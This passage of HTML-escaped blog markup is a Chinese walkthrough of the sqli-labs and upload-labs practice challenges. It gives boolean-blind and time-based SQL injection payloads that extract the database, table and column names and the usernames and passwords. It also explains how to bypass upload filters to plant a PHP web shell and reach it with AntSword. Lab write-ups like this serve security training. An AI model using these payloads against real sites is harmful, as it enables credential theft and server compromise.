+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39; and length((select group_concat(username,password) from users))&amp;gt;109--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;判断字段中所有内容的长度&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39; and ascii(substr((select group_concat(username,password) from users),1,1))&amp;gt;50--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;猜测每个内容的每个字符的长度。&lt;/p&gt;
+&lt;h2 id=&#34;第八关&#34;&gt;第八关
+&lt;/h2&gt;&lt;p&gt;第八关和第五关一样可以运用布尔盲注进行注入&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39;and length((select database()))&amp;gt;7--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;判断数据库名字长度是否大于9&lt;/p&gt;
+&lt;p&gt;若正确会显示you are in，错误则什么都不会显示。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39;and ascii(substr((select database()),1,1))=115--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这句代码是取数据库名字的第一个字的ascii码，若等于115则显示正确。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&amp;gt;13--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这段代码是相当于关卡一爆表的代码只不过是看所有表的长度是否大于了13。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&amp;gt;99--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;通过这段代码挨个字符猜测长度来把每个表给猜出来&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&amp;#39;users&amp;#39;))&amp;gt;20--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;通过这段代码查看所有字段的长度&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&amp;#39;users&amp;#39;),1,1))&amp;gt;99--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;判断每个字段的每个字符的ascii码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39; and length((select group_concat(username,password) from users))&amp;gt;109--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;判断字段中所有内容的长度&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39; and ascii(substr((select group_concat(username,password) from users),1,1))&amp;gt;50--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;猜测每个内容的每个字符的长度。&lt;/p&gt;
+&lt;h2 id=&#34;第九关&#34;&gt;第九关
+&lt;/h2&gt;&lt;p&gt;第九关输入什么都是一样的这时我们可以用延时注入。&lt;/p&gt;
+&lt;p&gt;这个语句就是延时注入，如果1=1则执行sleep(2)，否则执行1&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39; and if(1=1,sleep(2),1)--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;那么我们可以得到以下代码，如果数据库名字长度大于9则执行sleep(2),否则执行1&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39;and if(length((select database()))&amp;gt;9,sleep(2),1)--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;通过跟取ascii码拆分数据库每一个字符的ASCII码，若正确则执行sleep(2)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39;and if(ascii(substr((select database()),1,1))=115,sleep(2),1)--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;后面跟第五关语句基本类似&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&amp;gt;13,sleep(2),1)--+
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&amp;gt;10,sleep(2),1)--+
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&amp;#39;users&amp;#39;))&amp;gt;10,sleep(2),1)--+
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&amp;#39;users&amp;#39;),1,1))&amp;gt;10,sleep(2),1)--+
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39; and if(length((select group_concat(username,password) from users))&amp;gt;10,sleep(2),1)--+
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39; and if(ascii(substr((select group_concat(username,password) from users),1,1))&amp;gt;10,sleep(2),1)--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;三upload-labs&#34;&gt;三.upload-labs
+&lt;/h1&gt;&lt;h2 id=&#34;第一关-1&#34;&gt;第一关
+&lt;/h2&gt;&lt;p&gt;查看源码发现是白名单。&lt;/p&gt;
+&lt;p&gt;第一种&lt;/p&gt;
+&lt;p&gt;上传php文件进行抓包，发现提示只能上传.jpg|.png|.gif文件，可能是前端检测，使用浏览器进行审查元素，发现有前端检测的函数，删除函数即可绕过。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D.jpg&#34;
+	width=&#34;822&#34;
+	height=&#34;121&#34;
+	srcset=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D_hu939069164431406544.jpg 480w, https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D_hu8221241383826972254.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Photo&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;679&#34;
+		data-flex-basis=&#34;1630px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;第二种&lt;/p&gt;
+&lt;p&gt;上传jpg文件，进行抓包，在抓包软件中修改文件后缀，达到上传php文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C%E7%A7%8D.jpg&#34;
+	width=&#34;1494&#34;
+	height=&#34;807&#34;
+	srcset=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C%E7%A7%8D_hu17826614962547444776.jpg 480w, https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C%E7%A7%8D_hu11809900642452438820.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Photo&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;185&#34;
+		data-flex-basis=&#34;444px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;连接蚁剑&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C%E7%A7%8D2.jpg&#34;
+	width=&#34;1542&#34;
+	height=&#34;409&#34;
+	srcset=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C%E7%A7%8D2_hu9378591027626085856.jpg 480w, https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C%E7%A7%8D2_hu2162727462261360044.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Photo&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;377&#34;
+		data-flex-basis=&#34;904px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C%E7%A7%8D3.jpg&#34;
+	width=&#34;1545&#34;
+	height=&#34;437&#34;
+	srcset=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C%E7%A7%8D3_hu8169021143021056500.jpg 480w, https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C%E7%A7%8D3_hu9565461217047607684.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Photo&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;353&#34;
+		data-flex-basis=&#34;848px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;第二关-1&#34;&gt;第二关
+&lt;/h2&gt;&lt;p&gt;源码中$_FILES[&amp;lsquo;upload_file&amp;rsquo;] [&amp;rsquo;tmp_name&amp;rsquo;]文件被上传后在服务端储存的临时文件名，一般是系统默认。&lt;/p&gt;
+&lt;p&gt;而$_FILES[&amp;lsquo;upload_file&amp;rsquo;] [&amp;rsquo;type&amp;rsquo;]是文件的 MIME 类型，需要浏览器提供该信息的支持，比如&amp;quot;image/gif&amp;quot;。&lt;/p&gt;
+&lt;p&gt;发现是查看上传文件数据包中的Content-Type，我们只需要把类型修改为image/jpeg，image/png，image/gif就可以上传成功。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%BA%8C%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D1.jpg&#34;
+	width=&#34;1390&#34;
+	height=&#34;743&#34;
+	srcset=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%BA%8C%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D1_hu9858993740297570803.jpg 480w, https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%BA%8C%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D1_hu17729469436555934275.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Photo&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;187&#34;
+		data-flex-basis=&#34;448px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;下图是数据包&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%BA%8C%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D2.jpg&#34;
+	width=&#34;1495&#34;
+	height=&#34;838&#34;
+	srcset=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%BA%8C%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D2_hu9621868372680107397.jpg 480w, https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%BA%8C%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D2_hu4480627298698340651.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Photo&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;178&#34;
+		data-flex-basis=&#34;428px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;第三关&#34;&gt;第三关
+&lt;/h2&gt;&lt;p&gt;查看源代码，发现是黑名单，&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;存在提交文件进入&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;UPLOAD_PATH&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;存在上传的路径进入&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;deny_ext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.asp&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.aspx&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.jsp&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;定义一个黑名单数组&lt;/span&gt;
